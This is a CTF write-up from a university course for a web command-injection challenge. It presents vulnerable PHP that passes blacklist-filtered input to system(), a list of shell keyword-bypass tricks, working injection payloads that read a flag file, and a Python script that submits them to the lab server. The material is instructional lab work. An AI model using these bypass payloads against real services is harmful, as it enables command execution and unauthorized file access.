# 2023 NCU ADL CTF Writeups --- `web`

<div align="right">
    <p>
        <a href="https://1chooo.github.io/ctf-writeups/"><b>👨🏻‍💻 Home</b></a> |
        <a href="https://1chooo.github.io/ctf-writeups/pwn/"><b>🔒 <code>pwn</code></b></a> |
        <a href="https://1chooo.github.io/ctf-writeups/web/"><b>🌏 <code>web</code></b></a> |
        <a href="https://github.com/1chooo/ctf-writeups/tree/main/web/"><b>⌚️ GitHub</b></a>
    </p>
</div>

## 01. Monster

## 05. Command Injection

```php
<?php if (isset($_POST['json'])) : ?>
    <section class="has-text-left">
        <p>Result:</p>
        <pre><?php
        $blacklist = ['|', '&', ';', "\n", '?', '*', '$', 'cat', 'flag'];
        $is_input_safe = true;
        foreach ($blacklist as $bad_word)
            if (strstr($_POST['json'], $bad_word) !== false) $is_input_safe = false;

        if ($is_input_safe)
            system("echo '" . $_POST['json'] . "'| jq .bocchi");
        else
            echo '<img src="nanana.gif"/>';
        ?></pre>
    </section>
<?php endif; ?>
```

這段 PHP 代碼的主要功能是處理來自表單 POST 請求的資料，並對資料進行安全性檢查和處理。

1. **條件檢查：**  
   這段代碼開始於 `<?php if (isset($_POST['json'])) : ?>`，它首先檢查是否有名為 'json' 的資料以 POST 方式提交到這個網頁。

2. **顯示結果區域：**  
   如果有 'json' 資料提交，就會進入下一個部分，其中包含了以下內容：

   - **設置黑名單：**  
     ```php
     $blacklist = ['|', '&', ';', "\n", '?', '*', '$', 'cat', 'flag'];
     ```
     這行程式碼定義了一個 `$blacklist` 陣列，其中包含了一些可能會被用來試圖操縱系統的特殊字符或字串，例如命令注入字符 (`|`, `&`, `;` 等) 和特定字詞 (`cat`, `flag` 等)。

   - **安全性檢查：**  
     ```php
     $is_input_safe = true;
     foreach ($blacklist as $bad_word) {
         if (strstr($_POST['json'], $bad_word) !== false) {
             $is_input_safe = false;
         }
     }
     ```
     使用 `foreach` 迴圈遍歷黑名單，檢查提交的 'json' 資料是否包含黑名單中的任何字符或字串。如果發現任何不安全的字詞，則會將 `$is_input_safe` 設置為 `false`。

   - **安全性處理和輸出：**
     ```php
     if ($is_input_safe) {
         system("echo '" . $_POST['json'] . "'| jq .bocchi");
     } else {
         echo '<img src="nanana.gif"/>';
     }
     ```
     如果提交的 'json' 資料通過安全性檢查 (`$is_input_safe` 是 `true`)，則會執行一個系統命令使用 `system()`。這個命令使用 'jq' 工具（一個命令行下的 JSON 處理器）從提交的 JSON 資料中提取 'bocchi' 鍵的值，並在 `<pre>` 標籤中顯示它。

   - **處理不安全的輸入：**
     如果輸入被判定為不安全（包含黑名單中的內容），則會顯示一張圖片 (`nanana.gif`)，以預防性方式取代執行 'jq' 命令，這樣做可以防止處理不安全的輸入可能帶來的安全風險。

### Keyword繞過 [^1]

- String Concat
    - `A=fl;B=ag;cat $A$B`
- Empty Variable
    - `cat fl${x}ag`
    - `cat tes$(z)t/flag`
    
- Environment Variable
    - `$PATH => "/usr/local/….blablabla”`
        - `${PATH:0:1}   => '/'`
        - `${PATH:1:1}   => 'u'`
        - `${PATH:0:4}   => '/usr'`
    - `${PS2}` 
        - `>`
    - `${PS4}`
        - `+`
- Empty String
    - `cat fl""ag`
    - `cat fl''ag`
        - `cat "fl""ag"`

- 反斜線
    - `c\at fl\ag`


### Solution

因為從題目中我們可以看到，`cat` 和 `flag` 都在黑名單中，因此如果我們直接注入 `{"bocchi":"'`cat flag`'"}` 會得不到我們要的內容，會被原始碼裡的程式邏輯給擋掉，因此我們先嘗試了 `{"tenshi": "Ijichi Nijika", %%"bocchi"%%: "Goto Hitor-"}` 發現不會進到 else 但是也無法成功注入，後來我們找到了 Keyword 繞過的方法，在 `cat` 以及 `flag` 之中添加一些可以繞過的字串，也就是說還是會組成 `cat flag` 但是中間加上的字元會被繞過，因此我們最後注入的 payload 為：

1. <code>{"tenshi": "Ijichi Nijika", "bocchi":"'`tac f[l]ag`'"}</code>
2. <code>{"bocchi":"'`tac f[l]ag`'"}</code>
3. <code>{"bocchi":"'`c""at fl""ag`'"}</code>
4. <code>{"bocchi":"'`c\at fl\ag"}</code> (Not Successful)

我們也試過把 `cat` 給相反過來，並且在 `flag` 使用 keyword 繞過，也是有成功拿到 flag，注入的 payload 為：
1. <code>{"bocchi":"'`tac f[l]ag`'"}</code>

並且寫了一個 Python Script 來做注入，最後成功拿到 flag。

```python
import requests
from bs4 import BeautifulSoup

def send_json_to_form(json_data):
    url = 'http://140.115.59.7:12001/'

    # Set the data to be sent
    data = {
        'json': json_data
    }

    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            tag_content = soup.find('pre').text.strip()
            print("Content within <pre> tags:")
            print(tag_content)
        else:
            print("Error occurred, unable to send JSON data to the form.")
    except requests.RequestException as e:
        print("An exception occurred:", e)

# JSON data to send

json_to_send = '''{"bocchi":"'`tac f[l]ag`'"}'''
json_to_send = '''{"tenshi": "Ijichi Nijika", "bocchi":"'`tac f[l]ag`'"}'''
json_to_send = '''{"bocchi":"'`tac f[l]ag`'"}'''
json_to_send = '''{"bocchi":"'`c""at fl""ag`'"}'''

# Call the function to send JSON data to the form
send_json_to_form(json_to_send)
```

## CONTACT INFO.

> AWS Educate Cloud Ambassador, Technical Support 
> <br>
> **Hugo ChunHo Lin**
> 
> <aside>
>   📩 E-mail: <a href="mailto:hugo970217@gmail.com">hugo970217@gmail.com</a>
> <br>
>   🧳 Linkedin: <a href="https://www.linkedin.com/in/1chooo/">Hugo ChunHo Lin</a>
> <br>
>   👨🏻‍💻 GitHub: <a href="https://github.com/1chooo">1chooo</a>
>    
> </aside>

## License
Released under [MIT](https://1chooo.github.io/my-uni-courses/LICENSE) by [Hugo ChunHo Lin](https://github.com/1chooo).

This software can be modified and reused without restriction.
The original license must be included with any copies of this software.
If a significant portion of the source code is used, please provide a link back to this repository.

[^1]: [Command Injection#keyword 繞過](https://github.com/w181496/Web-CTF-Cheatsheet?tab=readme-ov-file#command-injection)


<div align="center">
    <p>
        <a href="https://github.com/1chooo" target="_blank"><b>👨🏻 GitHub</b></a> |
        <a href="https://1chooo-github-io-1chooo.vercel.app/" target="_blank"><b>👨🏻‍💻 Portfolio</b></a> |
        <a href="https://1chooo.github.io/1chooo-blog/" target="_blank"><b>📓 Blog</b></a> |
        <a href="https://1chooo-github-io-1chooo.vercel.app/resume" target="_blank"><b>🧳 Resume</b></a> |
        <a href="https://medium.com/@1chooo" target="_blank"><b>📠 Medium</b></a> |
        <a href="https://www.youtube.com/channel/UCpBU1rXOfdTtxX939f_P_dA" target="_blank"><b>🎥 YouTube</b></a>
    </p>
    <div>
        <b>©2023-2024  Hugo H. Lin</b>
    </div>
</div>